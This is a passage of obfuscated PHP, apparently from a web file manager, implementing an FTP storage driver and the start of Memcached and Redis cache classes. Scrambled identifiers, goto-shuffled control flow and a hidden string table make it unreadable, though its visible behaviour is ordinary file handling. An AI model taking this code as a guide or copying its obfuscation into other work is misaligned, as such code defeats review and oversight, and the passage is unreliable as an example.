$this->region, $cÈ˜ŒÍÈä, !0); goto D¦ÉŒĞç„·; d”ì¥ŠÏ•–: $eŠÛ±‚Ğó =& $_SERVER[Äº¡•ô™Ÿ]; $D“Ü²ÅÄÚ– = $eŠÛ±‚Ğó[182]; $e»áìÃÜå = $eŠÛ±‚Ğó[1126]; goto FÆå‹ˆ¡‚; Bºà†ã¬¼¹: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($bÊ Â…Ë²†) { parent::__construct(); if (count($bÊ Â…Ë²†) > 0) { $this->_init($bÊ Â…Ë²†); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($aËè÷ã„ƒÒ) { $bÈ–§±É½´ =& $_SERVER[Äº¡•ô™Ÿ]; global $config; $this->appCharset = $config[$bÈ–§±É½´[1144]]; $this->systemCharset = $config[$bÈ–§±É½´[1145]]; if (isset($aËè÷ã„ƒÒ[$bÈ–§±É½´[1146]]) && $aËè÷ã„ƒÒ[$bÈ–§±É½´[1146]]) { $this->systemCharset = $aËè÷ã„ƒÒ[$bÈ–§±É½´[1146]]; } } public function iconvApp($FŠÅÈ†ê‡±) { return $this->iconvTo($FŠÅÈ†ê‡±, $this->systemCharset, $this->appCharset); } public function iconvSystem($e¦ùÙ©‘¸ô) { return $this->iconvTo($e¦ùÙ©‘¸ô, $this->appCharset, $this->systemCharset); } public function getPathOuter($D÷’Â£‘™ç) { goto bµ¼µóĞù; FÍÁøëŒï: if (substr($e‹áï£œÏ×, 0, 2) == $Aâ´¸š[1147]) { $e‹áï£œÏ× = BASIC_PATH . substr($e‹áï£œÏ×, 2); } if (substr($D÷’Â£‘™ç, 0, 2) == $Aâ´¸š[1147]) { $D÷’Â£‘™ç = BASIC_PATH . substr($D÷’Â£‘™ç, 2); } $e‹áï£œÏ× = KodIO::clear($e‹áï£œÏ×); goto E¤¸ÑËŠ“; bµ¼µóĞù: $Aâ´¸š =& $_SERVER[Äº¡•ô™Ÿ]; $e‹áï£œÏ× = $this->iconvApp($this->pathBase); $D÷’Â£‘™ç = $this->iconvApp($D÷’Â£‘™ç); goto FÍÁøëŒï; AÒ›Ú²İòô: return $this->pathDriver . $Aâ´¸š[8] . ltrim($D÷’Â£‘™ç, $Aâ´¸š[8]); goto dÂ¬­©£¿°; E¤¸ÑËŠ“: $D÷’Â£‘™ç = KodIO::clear($D÷’Â£‘™ç); $D÷’Â£‘™ç = substr($D÷’Â£‘™ç, strlen($e‹áï£œÏ×)); if (empty($this->pathDriver)) { return $D÷’Â£‘™ç; } goto AÒ›Ú²İòô; dÂ¬­©£¿°: } private function _init($Cƒ·«êíœ® = array()) { goto c“‹ÇÛ“˜†; BÆëÊ¥‹éÕ: foreach ($Cƒ·«êíœ® as $C·ªºÚ©¬ª => $B«öØ«™…) { if (isset($this->{$C·ªºÚ©¬ª})) { $this->{$C·ªºÚ©¬ª} = $B«öØ«™…; } } static $E„ëÑ‹÷ôí = array(); $D¡óŞò–ˆÈ = md5(json_encode($Cƒ·«êíœ®)); goto f¥š±ÛÕ©ª; DÜåêëá™¥: return $fºĞß‹Êø®; goto Fµ›ÕÀáĞ½; c“‹ÇÛ“˜†: $C±ŒÖ¿´ˆ =& $_SERVER[Äº¡•ô™Ÿ]; if (!function_exists($C±ŒÖ¿´ˆ[1148])) { show_json(LNG($C±ŒÖ¿´ˆ[1149]), !1); } $this->charsetReset($Cƒ·«êíœ®); goto BÆëÊ¥‹éÕ; f¥š±ÛÕ©ª: if (isset($E„ëÑ‹÷ôí[$D¡óŞò–ˆÈ])) { foreach ($E„ëÑ‹÷ôí[$D¡óŞò–ˆÈ] as $C·ªºÚ©¬ª => $B«öØ«™…) { $this->{$C·ªºÚ©¬ª} = $B«öØ«™…; } return !0; } $CËÙ½ƒÕ  = parse_url(trim($this->server, $C±ŒÖ¿´ˆ[8])); $this->host = $CËÙ½ƒÕ [$C±ŒÖ¿´ˆ[166]]; goto c§Ç‚é®Î; DŒ‚³·çŒ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $fºĞß‹Êø® = @ftp_login($this->connect, $this->username, $this->userpass); goto c’–ã¦¥ «; c’–ã¦¥ «: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $E„ëÑ‹÷ôí[$D¡óŞò–ˆÈ] = array($C±ŒÖ¿´ˆ[1153] => $this->connect, $C±ŒÖ¿´ˆ[166] => $this->host, $C±ŒÖ¿´ˆ[165] => $this->scheme, $C±ŒÖ¿´ˆ[167] => $this->port); goto DÜåêëá™¥; c§Ç‚é®Î: $c›Ü”Ş˜Ü¶ = isset($CËÙ½ƒÕ [$C±ŒÖ¿´ˆ[165]]) && $CËÙ½ƒÕ [$C±ŒÖ¿´ˆ[165]] == $C±ŒÖ¿´ˆ[1150] ? !0 : !1; $this->scheme = $c›Ü”Ş˜Ü¶ ? $C±ŒÖ¿´ˆ[1151] : $C±ŒÖ¿´ˆ[1152]; $this->port = isset($CËÙ½ƒÕ [$C±ŒÖ¿´ˆ[167]]) ? $CËÙ½ƒÕ [$C±ŒÖ¿´ˆ[167]] : 21; goto DŒ‚³·çŒ; Fµ›ÕÀáĞ½: } private function _isconn() { return is_resource($this->connect); } public function mkfile($b¯Šæ³Ç„Š, $cæáÁƒôÑ› = '', $bêè¸ÃéÛÑ = REPEAT_RENAME) { if ($this->setContent($b¯Šæ³Ç„Š, $cæáÁƒôÑ›)) { return $this->getPathOuter($b¯Šæ³Ç„Š); } return !1; } public function mkdir($Cëç­Ø»–ê, $a¬´æ×Ìœî = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Cëç­Ø»–ê = $this->iconvSystem($Cëç­Ø»–ê); if ($this->isFolder($Cëç­Ø»–ê) || @ftp_mkdir($this->connect, $Cëç­Ø»–ê)) { return $this->getPathOuter($Cëç­Ø»–ê); } if (!$this->mkdir($this->pathFather($Cëç­Ø»–ê))) { return !1; } if ($Cëç­Ø»–ê = @ftp_mkdir($this->connect, $Cëç­Ø»–ê)) { return $this->getPathOuter($Cëç­Ø»–ê); } return !1; } public function copyFile($CÕíõ¾ ì, $AáÔ­Š¬ù) { goto fº—ñè²; fº—ñè²: if (!$this->_isconn()) { return !1; } $C»ˆŠ¤†É = $this->pathThis($this->iconvSystem($CÕíõ¾ ì)); $e¿«Œ‚å÷‚ = $this->tempFile($C»ˆŠ¤†É); goto c¢£·Ó«‚; c¢£·Ó«‚: $a›Š®øò°‰ = $this->iconvApp($e¿«Œ‚å÷‚); $this->download($CÕíõ¾ ì, $a›Š®øò°‰); $cË£ŞÏ„–Ë = $this->upload($AáÔ­Š¬ù, $a›Š®øò°‰); goto Dì¾³¹¼Û; Dì¾³¹¼Û: $this->tempFileRemve($e¿«Œ‚å÷‚); return $cË£ŞÏ„–Ë; goto B»ïá“Ä; B»ïá“Ä: } public function moveFile($fáŸÅƒÑÛ‘, $b¦²ºç˜ª¥) { if (!$this->_isconn()) { return !1; } $fáŸÅƒÑÛ‘ = $this->iconvSystem($fáŸÅƒÑÛ‘); $b¦²ºç˜ª¥ = $this->iconvSystem($b¦²ºç˜ª¥); $dâ°‘Õ„Œˆ = @ftp_rename($this->connect, $fáŸÅƒÑÛ‘, $b¦²ºç˜ª¥); return $dâ°‘Õ„Œˆ ? $this->getPathOuter($b¦²ºç˜ª¥) : !1; } public function delFile($c‡¸äõ¾…ƒ) { if (!$this->_isconn()) { return !1; } $c‡¸äõ¾…ƒ = $this->iconvSystem($c‡¸äõ¾…ƒ); return @ftp_delete($this->connect, $c‡¸äõ¾…ƒ); } public function delFolder($C«ìî’œ¾Ú) { if (!$this->_isconn()) { return !1; } $C«ìî’œ¾Ú = $this->iconvSystem($C«ìî’œ¾Ú); $fğ—ëÕ©‚ø = $this->ftpList($C«ìî’œ¾Ú); if (!$fğ—ëÕ©‚ø) { return @ftp_rmdir($this->connect, $C«ìî’œ¾Ú); } foreach ($fğ—ëÕ©‚ø as $aóİµöÅÔó) { if ($this->isFolder($aóİµöÅÔó)) { $aóİµöÅÔó = $this->iconvApp($aóİµöÅÔó); $this->delFolder($aóİµöÅÔó); } else { @ftp_delete($this->connect, $aóİµöÅÔó); } } return @ftp_rmdir($this->connect, $C«ìî’œ¾Ú); } public function rename($Aˆõø¦ÁÄ‘, $CÉÍ°†Ã†—) { goto b¼¸×Öğñ”; E¸Œğ½—Í¼: return $EÅå ¢ˆËé ? $this->getPathOuter($e‰îîÙ±„š) : !1; goto Cï«ùæ‡Åà; b¼¸×Öğñ”: $DŒœÅ´×‰° =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->_isconn()) { return !1; } $B´ëÖº®¶  = $this->fileNameAuto($this->pathFather($Aˆõø¦ÁÄ‘), $CÉÍ°†Ã†—); goto FÕİ¼ô°‹; EœÑœ±Ëà¤: $e‰îîÙ±„š = rtrim($Bà³À÷õí, $DŒœÅ´×‰°[8]) . $DŒœÅ´×‰°[8] . $B´ëÖº®¶ ; $EÅå ¢ˆËé = @ftp_rename($this->connect, $Aˆõø¦ÁÄ‘, $e‰îîÙ±„š); $e‰îîÙ±„š = $this->iconvApp($e‰îîÙ±„š); goto E¸Œğ½—Í¼; FÕİ¼ô°‹: $B´ëÖº®¶  = $this->iconvSystem($B´ëÖº®¶ ); $Aˆõø¦ÁÄ‘ = $this->iconvSystem($Aˆõø¦ÁÄ‘); $Bà³À÷õí = $this->pathFather($Aˆõø¦ÁÄ‘); goto EœÑœ±Ëà¤; Cï«ùæ‡Åà: } private function folderInfo($D®¨Ú•Ÿá, $d—×Îô‚˜© = false) { goto E·ãğ°Œ¨ï; E¡åÛ¬ÎÛ»: $E½Ş­Š¾Ò = $this->iconvSystem($D®¨Ú•Ÿá); if ($d—×Îô‚˜©) { return array($AŸÍ…¤ºÁ¦[28] => $E‡––ãæ†Ş, $AŸÍ…¤ºÁ¦[75] => $b³¯ÊÔ­ÁÌ, $AŸÍ…¤ºÁ¦[29] => $AŸÍ…¤ºÁ¦[76]); } $a¿›Š¬‹ˆì = array($AŸÍ…¤ºÁ¦[28] => $E‡––ãæ†Ş, $AŸÍ…¤ºÁ¦[75] => $b³¯ÊÔ­ÁÌ, $AŸÍ…¤ºÁ¦[29] => $AŸÍ…¤ºÁ¦[76], $AŸÍ…¤ºÁ¦[184] => 0, $AŸÍ…¤ºÁ¦[107] => 0, $AŸÍ…¤ºÁ¦[1154] => !0, $AŸÍ…¤ºÁ¦[1155] => !0); goto Fƒä§ÊçÂŞ; Fƒä§ÊçÂŞ: return $a¿›Š¬‹ˆì; goto dÅß˜ËäØØ; E·ãğ°Œ¨ï: $AŸÍ…¤ºÁ¦ =& $_SERVER[Äº¡•ô™Ÿ]; $b³¯ÊÔ­ÁÌ = $this->getPathOuter(rtrim($D®¨Ú•Ÿá, $AŸÍ…¤ºÁ¦[8])); $E‡––ãæ†Ş = $this->pathThis($b³¯ÊÔ­ÁÌ); goto E¡åÛ¬ÎÛ»; dÅß˜ËäØØ: } private function fileInfo($d—˜ßƒÀ¸, $aàÏÕÓçÕ© = false) { goto FŒÁÃ°î¬®; Fª£ŞÓ°É: $BÚ÷ÓËŠ´[$a–ÉĞ¬ÏÃ[107]] = $BÚ÷ÓËŠ´[$a–ÉĞ¬ÏÃ[107]] > 0 ? $BÚ÷ÓËŠ´[$a–ÉĞ¬ÏÃ[107]] : 0; return $BÚ÷ÓËŠ´; goto F×†­´“; FŒÁÃ°î¬®: $a–ÉĞ¬ÏÃ =& $_SERVER[Äº¡•ô™Ÿ]; $Aë§·‚á“÷ = $this->getPathOuter(rtrim($d—˜ßƒÀ¸, $a–ÉĞ¬ÏÃ[8])); $dßê±ÚäÖ = $this->pathThis($Aë§·‚á“÷); goto f•Ø°É•²Œ; f•Ø°É•²Œ: $F¦¨¢ºƒˆ¥ = $this->iconvSystem($d—˜ßƒÀ¸); if ($aàÏÕÓçÕ©) { return array($a–ÉĞ¬ÏÃ[28] => $dßê±ÚäÖ, $a–ÉĞ¬ÏÃ[75] => $Aë§·‚á“÷, $a–ÉĞ¬ÏÃ[29] => $a–ÉĞ¬ÏÃ[164], $a–ÉĞ¬ÏÃ[157] => $this->ext($d—˜ßƒÀ¸), $a–ÉĞ¬ÏÃ[77] => $this->size($d—˜ßƒÀ¸)); } $BÚ÷ÓËŠ´ = array($a–ÉĞ¬ÏÃ[28] => $dßê±ÚäÖ, $a–ÉĞ¬ÏÃ[75] => $Aë§·‚á“÷, $a–ÉĞ¬ÏÃ[29] => $a–ÉĞ¬ÏÃ[164], $a–ÉĞ¬ÏÃ[184] => 0, $a–ÉĞ¬ÏÃ[107] => @ftp_mdtm($this->connect, $F¦¨¢ºƒˆ¥), $a–ÉĞ¬ÏÃ[157] => $this->ext($d—˜ßƒÀ¸), $a–ÉĞ¬ÏÃ[77] => $this->size($d—˜ßƒÀ¸), $a–ÉĞ¬ÏÃ[1154] => !0, $a–ÉĞ¬ÏÃ[1155] => !0); goto Fª£ŞÓ°É; F×†­´“: } public function size($f‹–‚è‚Ì—) { $D­‰ÛÄ‰‰Š = $this->objectMeta($f‹–‚è‚Ì—); return $D­‰ÛÄ‰‰Š ? $D­‰ÛÄ‰‰Š[$_SERVER[Äº¡•ô™Ÿ][77]] : 0; } public function info($aÈÁË¿Ùˆâ) { if ($this->isFile($aÈÁË¿Ùˆâ)) { return $this->fileInfo($aÈÁË¿Ùˆâ, 0); } else { if ($this->isFolder($aÈÁË¿Ùˆâ)) { return $this->folderInfo($aÈÁË¿Ùˆâ); } } return !1; } public function exist($C‘à†ùÕİ­) { return $this->objectMeta($C‘à†ùÕİ­) ? !0 : !1; } public function isFile($AÖÍøèÄ“) { $dÖš‹êí…‚ =& $_SERVER[Äº¡•ô™Ÿ]; $B—Î…ŒÎ£Í = $this->objectMeta($AÖÍøèÄ“); return $B—Î…ŒÎ£Í ? $B—Î…ŒÎ£Í[$dÖš‹êí…‚[29]] == $dÖš‹êí…‚[164] : !1; } public function isFolder($bé¤‡–¨Çè) { $DºÛ‹ä¨”ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $bïÎÒ®Ø¨ñ = $this->objectMeta($bé¤‡–¨Çè); return $bïÎÒ®Ø¨ñ ? $bïÎÒ®Ø¨ñ[$DºÛ‹ä¨”ƒ[29]] == $DºÛ‹ä¨”ƒ[76] : !1; } public function listPath($eªŸ’‡ºç®, $Bİ²§ì¿Ò = false) { goto f¥ß¤ˆãÁ; AÆ±‰à¿: foreach ($A°’§ˆåˆõ as $eªŸ’‡ºç®) { if ($this->isFolder($eªŸ’‡ºç®)) { $FÖ¤ŞÃƒ„[$dª¯ìÖˆ›å[74]][] = $this->folderInfo($eªŸ’‡ºç®, $Bİ²§ì¿Ò); } else { $FÖ¤ŞÃƒ„[$dª¯ìÖˆ›å[73]][] = $this->fileInfo($eªŸ’‡ºç®, $Bİ²§ì¿Ò); } } return $FÖ¤ŞÃƒ„; goto dÅ•ˆö²¸Ô; e”¢Š¾ñƒ: $A°’§ˆåˆõ = $this->ftpList($eªŸ’‡ºç®); $FÖ¤ŞÃƒ„ = array($dª¯ìÖˆ›å[74] => array(), $dª¯ìÖˆ›å[73] => array()); if (!$A°’§ˆåˆõ) { return $FÖ¤ŞÃƒ„; } goto AÆ±‰à¿; f¥ß¤ˆãÁ: $dª¯ìÖˆ›å =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->_isconn()) { return !1; } $eªŸ’‡ºç® = $this->iconvSystem($eªŸ’‡ºç®); goto e”¢Š¾ñƒ; dÅ•ˆö²¸Ô: } public function has($C‰í‚‡à‡é, $D¸éÙ™¤ = false, $fËÛ¼Í”ùö = true) { goto aõ®ÀŠë…ç; Cº„ó ÂÜ£: foreach ($bñÁ›ØÃ¯ as $C‰í‚‡à‡é) { if ($fËÛ¼Í”ùö) { if (!$this->isFolder($C‰í‚‡à‡é)) { return !0; } } else { if ($this->isFolder($C‰í‚‡à‡é)) { return !0; } } } return !1; goto BØ“Ëòæ¦é; CÊÊ°¬ŠÃ: $bñÁ›ØÃ¯ = $this->ftpList($C‰í‚‡à‡é); if (!$bñÁ›ØÃ¯) { return !1; } if ($D¸éÙ™¤) { return array($bå±˜¸‘£ˆ[188] => 0, $bå±˜¸‘£ˆ[189] => count($bñÁ›ØÃ¯)); } goto Cº„ó ÂÜ£; aõ®ÀŠë…ç: $bå±˜¸‘£ˆ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->_isconn()) { return !1; } $C‰í‚‡à‡é = $this->iconvSystem($C‰í‚‡à‡é); goto CÊÊ°¬ŠÃ; BØ“Ëòæ¦é: } public function listAll($D™šŒ‰™Òæ) { goto A•ùŸáÁ°á; A•ùŸáÁ°á: $b…ÎŸ‹¤Š£ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->_isconn()) { return !1; } $D™šŒ‰™Òæ = $this->iconvSystem($D™šŒ‰™Òæ); goto F­ùé‹ÂÚ£; cÉ¢‰‘Œö›: foreach ($b±—™îã°›[$b…ÎŸ‹¤Š£[74]] as $c¾„”ªèñÁ) { $C…Ëôãª[] = array($b…ÎŸ‹¤Š£[75] => $b…ÎŸ‹¤Š£[8] . trim(str_replace($D™šŒ‰™Òæ, $b…ÎŸ‹¤Š£[33], $c¾„”ªèñÁ), $b…ÎŸ‹¤Š£[8]) . $b…ÎŸ‹¤Š£[8], $b…ÎŸ‹¤Š£[76] => 1, $b…ÎŸ‹¤Š£[77] => 0); } foreach ($b±—™îã°›[$b…ÎŸ‹¤Š£[73]] as $C¥‘—Ç½é) { $C…Ëôãª[] = array($b…ÎŸ‹¤Š£[75] => $b…ÎŸ‹¤Š£[8] . trim(str_replace($D™šŒ‰™Òæ, $b…ÎŸ‹¤Š£[33], $C¥‘—Ç½é), $b…ÎŸ‹¤Š£[8]), $b…ÎŸ‹¤Š£[76] => 0, $b…ÎŸ‹¤Š£[77] => $this->size($C¥‘—Ç½é)); } return $C…Ëôãª; goto Aß™‰¦ÀÒ; F­ùé‹ÂÚ£: $b±—™îã°› = array($b…ÎŸ‹¤Š£[73] => array(), $b…ÎŸ‹¤Š£[74] => array()); $this->recursionFtpFiles($D™šŒ‰™Òæ, $b±—™îã°›); $C…Ëôãª = array(); goto cÉ¢‰‘Œö›; Aß™‰¦ÀÒ: } public function getContent($b°ê°Ä½·­) { if (!$this->_isconn()) { return !1; } $b°ê°Ä½·­ = $this->iconvSystem($b°ê°Ä½·­); return $this->fileSubstr($b°ê°Ä½·­); } public function setContent($b´âÉ»††, $fÛæš¼¢ß = '') { goto bœ¶²Ö³Ö“; f´È†¤ñ‡ø: file_put_contents($E„ëÏÏÀò‚, $fÛæš¼¢ß); $C”ÉÅí§’Š = $this->upload($b´âÉ»††, $this->iconvApp($E„ëÏÏÀò‚)); $this->tempFileRemve($E„ëÏÏÀò‚); goto E“ÁÇ¸¼”—; bœ¶²Ö³Ö“: if (!$this->_isconn()) { return !1; } $AŠêƒ öÃ = $this->pathThis($this->iconvSystem($b´âÉ»††)); $E„ëÏÏÀò‚ = $this->tempFile($AŠêƒ öÃ); goto f´È†¤ñ‡ø; E“ÁÇ¸¼”—: return $C”ÉÅí§’Š; goto fµæ‚ôƒÀ ; fµæ‚ôƒÀ : } public function fileSubstr($dÒíì÷×«ù, $cÈò»öæìº = 0, $bĞ†À†ğÂÍ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dÒíì÷×«ù, $cÈò»öæìº, $bĞ†À†ğÂÍ); } private function ftpRequest($a’‘±ÚË¦ç, $eâ¢ÎÔ = 0, $Dóôó®¤Ô® = false) { goto A ²ÌÅÂÎç; b‡Áâ§†¿: curl_setopt($D‡»­¥¿î, CURLOPT_URL, $f«™Õ½»£ä . $this->pathEncode($a’‘±ÚË¦ç)); curl_setopt($D‡»­¥¿î, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Dóôó®¤Ô®) { $BËç‡ßÌõ• = $eâ¢ÎÔ + $Dóôó®¤Ô® - 1; curl_setopt($D‡»­¥¿î, CURLOPT_RANGE, "{$eâ¢ÎÔ}\x2d{$BËç‡ßÌõ•}"); } goto eËàì«Æ°µ; EóŠ‰ËÀÀÊ: return $E…÷ï¡·Ù; goto a¹¨ºŒ‚„˜; A ²ÌÅÂÎç: $a’‘±ÚË¦ç = $this->iconvSystem($a’‘±ÚË¦ç); $f«™Õ½»£ä = $this->scheme . $this->host . $_SERVER[Äº¡•ô™Ÿ][4] . $this->port; $D‡»­¥¿î = curl_init(); goto b‡Áâ§†¿; eËàì«Æ°µ: curl_setopt($D‡»­¥¿î, CURLOPT_RETURNTRANSFER, 1); $E…÷ï¡·Ù = curl_exec($D‡»­¥¿î); curl_close($D‡»­¥¿î); goto EóŠ‰ËÀÀÊ; a¹¨ºŒ‚„˜: } public function upload($Aõ”†«¸›, $EÖÍË‹¾‰¨, $a‡çˆì‚Åõ = false, $cùâ‘¨ªŠ˜ = REPEAT_REPLACE) { goto F²­ŞÓÑ´Ü; F²­ŞÓÑ´Ü: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Aõ”†«¸›))) { return !1; } $Aõ”†«¸› = $this->iconvSystem($Aõ”†«¸›); goto bÒ‘øŒßíÖ; bÒ‘øŒßíÖ: $EÖÍË‹¾‰¨ = $this->iconvSystem($EÖÍË‹¾‰¨); $e”†Ç“Ó¡Õ = ftp_nb_put($this->connect, $Aõ”†«¸›, $EÖÍË‹¾‰¨, FTP_BINARY); while ($e”†Ç“Ó¡Õ == FTP_MOREDATA) { $e”†Ç“Ó¡Õ = ftp_nb_continue($this->connect); } goto D»Ÿ¬æ‚Îº; D»Ÿ¬æ‚Îº: if ($e”†Ç“Ó¡Õ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Aõ”†«¸›); goto A“³Ïèéƒ; A“³Ïèéƒ: } public function download($f°˜²³‡ğ¦, $ağ›ùˆçöÍ = '') { goto bç¾¢°ßŒÑ; a‡ÖŒ‚÷çì: while ($CÜâè‚Õğá == FTP_MOREDATA) { $CÜâè‚Õğá = ftp_nb_continue($this->connect); } if ($CÜâè‚Õğá != FTP_FINISHED) { return !1; } return $this->iconvApp($ağ›ùˆçöÍ); goto eã£œ¼ íˆ; C‘Ò¶–ùÙ: $f°˜²³‡ğ¦ = $this->iconvSystem($f°˜²³‡ğ¦); $ağ›ùˆçöÍ = $this->iconvSystem($ağ›ùˆçöÍ); $CÜâè‚Õğá = ftp_nb_get($this->connect, $ağ›ùˆçöÍ, $f°˜²³‡ğ¦, FTP_BINARY); goto a‡ÖŒ‚÷çì; bç¾¢°ßŒÑ: if (!$this->_isconn()) { return !1; } $fİÏÄ Ùí¬ = $this->pathFather($ağ›ùˆçöÍ); if (!IO::mkdir($fİÏÄ Ùí¬)) { return !1; } goto C‘Ò¶–ùÙ; eã£œ¼ íˆ: } private function ftpList($FÙÅà¬„) { goto F‡êíŒõÒã; F‡êíŒõÒã: $A¥ß§„—© =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->isFolder($FÙÅà¬„)) { return !1; } @ftp_chdir($this->connect, $A¥ß§„—©[8]); goto B‡Ç¸ÜÏÄ; B‡Ç¸ÜÏÄ: $FÙÅà¬„ = rtrim($FÙÅà¬„, $A¥ß§„—©[8]) . $A¥ß§„—©[8]; $d—‚ŞÎ´®ƒ = @ftp_nlist($this->connect, $FÙÅà¬„); if ($d—‚ŞÎ´®ƒ === !1) { $d—‚ŞÎ´®ƒ = @ftp_rawlist($this->connect, $FÙÅà¬„); foreach ($d—‚ŞÎ´®ƒ as $A¥æ©é¦Â† => $d‡¿ëòÎÃ) { $d—‚ŞÎ´®ƒ[$A¥æ©é¦Â†] = end(explode($A¥ß§„—©[1156], $d‡¿ëòÎÃ)); } } goto BùÒ¬à“ä; BùÒ¬à“ä: $bŒÆ²Ê—–é = array(); foreach ($d—‚ŞÎ´®ƒ as $D—‘ßÔó’À) { if ($D—‘ßÔó’À == $A¥ß§„—©[93] || $D—‘ßÔó’À == $A¥ß§„—©[1157]) { continue; } if (!strstr($D—‘ßÔó’À, $A¥ß§„—©[8])) { $D—‘ßÔó’À = $FÙÅà¬„ . ltrim($D—‘ßÔó’À, $A¥ß§„—©[8]); } $bŒÆ²Ê—–é[] = $this->iconvApp($D—‘ßÔó’À); } return $bŒÆ²Ê—–é; goto A·‹ã„µ¹á; A·‹ã„µ¹á: } private function recursionFtpFiles($DÔÖÒ®Ì¨ô, &$CäÀ­Çï×÷) { $CƒÑÇŸØ¼¡ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->_isconn()) { return !1; } if (!($a´ŞöÜì˜Ï = $this->ftpList($DÔÖÒ®Ì¨ô))) { return !1; } foreach ($a´ŞöÜì˜Ï as $DÔÖÒ®Ì¨ô) { if ($this->isFolder($DÔÖÒ®Ì¨ô)) { $this->recursionFtpFiles($DÔÖÒ®Ì¨ô, $CäÀ­Çï×÷); $CäÀ­Çï×÷[$CƒÑÇŸØ¼¡[74]][] = $DÔÖÒ®Ì¨ô; } else { $CäÀ­Çï×÷[$CƒÑÇŸØ¼¡[73]][] = $DÔÖÒ®Ì¨ô; } } } private function objectMeta($E¼ğ½èÏ“†) { goto Aáùñº†ÜÁ; Aáùñº†ÜÁ: $d‹‘¹˜Ù ‰ =& $_SERVER[Äº¡•ô™Ÿ]; $bƒöÆ­ˆ’§ = $d‹‘¹˜Ù ‰[1158] . md5($E¼ğ½èÏ“†); $Cæƒö…îö¿ = Cache::get($bƒöÆ­ˆ’§); goto b¨é”“–‹Ø; b¨é”“–‹Ø: if ($Cæƒö…îö¿ !== null && $Cæƒö…îö¿ !== !1) { return $Cæƒö…îö¿; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $d‹‘¹˜Ù ‰[8]); goto Cî Ùôƒ•ï; Cî Ùôƒ•ï: $E…Š¢¦ÌÊ = @ftp_size($this->connect, $this->iconvSystem($E¼ğ½èÏ“†)); if ($E…Š¢¦ÌÊ != -1) { $Cæƒö…îö¿ = array($d‹‘¹˜Ù ‰[77] => $E…Š¢¦ÌÊ, $d‹‘¹˜Ù ‰[29] => $d‹‘¹˜Ù ‰[164]); } else { $Fïê‘¦ì‰Š = @ftp_chdir($this->connect, $this->iconvSystem($E¼ğ½èÏ“†)); $Cæƒö…îö¿ = $Fïê‘¦ì‰Š ? array($d‹‘¹˜Ù ‰[77] => 0, $d‹‘¹˜Ù ‰[29] => $d‹‘¹˜Ù ‰[76]) : !1; } Cache::set($bƒöÆ­ˆ’§, $Cæƒö…îö¿, 0); goto b†»èƒ¹î; b†»èƒ¹î: return $Cæƒö…îö¿; goto d¢áÃ©Á¯; d¢áÃ©Á¯: } } goto cøÃÉ³Ø„»; FÚƒÓªùÇ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($EÑ §§˜ó, $AµŠ¸“ÂØ) { $FäÈ“›–Ïå =& $_SERVER[Äº¡•ô™Ÿ]; if (!class_exists($FäÈ“›–Ïå[779])) { show_json($FäÈ“›–Ïå[780], !1); } $this->cacheTime = $AµŠ¸“ÂØ; $this->handle = new Memcached(); if (is_array($EÑ §§˜ó[$FäÈ“›–Ïå[781]]) && count($EÑ §§˜ó[$FäÈ“›–Ïå[781]]) >= 1) { foreach ($EÑ §§˜ó[$FäÈ“›–Ïå[781]] as $eôÉ¢¬ô—) { $Cöë„«çã = explode($FäÈ“›–Ïå[4], $eôÉ¢¬ô—); $this->handle->addServer($Cöë„«çã[0], $Cöë„«çã[1]); } } else { $this->handle->addServer($EÑ §§˜ó[$FäÈ“›–Ïå[166]], $EÑ §§˜ó[$FäÈ“›–Ïå[167]]); } } public function set($d¬ø§Û¬óÃ, $aœÔƒÄñÎ†, $F¸©ñ¡Š‰ = false) { $F¸©ñ¡Š‰ = $F¸©ñ¡Š‰ ? $F¸©ñ¡Š‰ : $this->cacheTime; return $this->handle->set($d¬ø§Û¬óÃ, $aœÔƒÄñÎ†, $F¸©ñ¡Š‰); } public function get($a­¦¡çŞÖ) { return $this->handle->get($a­¦¡çŞÖ); } public function remove($aô¡œ•öä) { return $this->handle->delete($aô¡œ•öä); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($C²ˆßÜô”‚, $c—èÔÀ‡Ú) { $eÛÛ¡äô¼è =& $_SERVER[Äº¡•ô™Ÿ]; if (!class_exists($eÛÛ¡äô¼è[782])) { show_json($eÛÛ¡äô¼è[783], !1); } $this->cacheTime = $c—èÔÀ‡Ú; $f´ƒ‘›µ§ì = isset($C²ˆßÜô”‚[$eÛÛ¡äô¼è[784]]) ? $C²ˆßÜô”‚[$eÛÛ¡äô¼è[784]] : 10; $f¿¹éÅŠ¤Œ = _get($C²ˆßÜô”‚, $eÛÛ¡äô¼è[781]); if ($f¿¹éÅŠ¤Œ && is_array($f¿¹éÅŠ¤Œ)) { $this->isCluster = !0; $this->initCluster($C²ˆßÜô”‚, $f´ƒ‘›µ§ì); } else { $this->handle = $this->init($C²ˆßÜô”‚, $f´ƒ‘›µ§ì); } } private function init($D¨³îî’Øó, $AÁšÙŒä¨½) { $Eôâùˆ÷’Ÿ =& $_SERVER[Äº¡•ô™Ÿ]; $bƒ«Ñ°Ò« = new Redis(); $CçˆÕ­„ÏÎ = isset($D¨³îî’Øó[$Eôâùˆ÷’Ÿ[785]]) ? $D¨³îî’Øó[$Eôâùˆ÷’Ÿ[785]] : !1; if ($CçˆÕ­„ÏÎ) { $bƒ«Ñ°Ò«->pconnect($D¨³îî’Øó[$Eôâùˆ÷’Ÿ[166]], 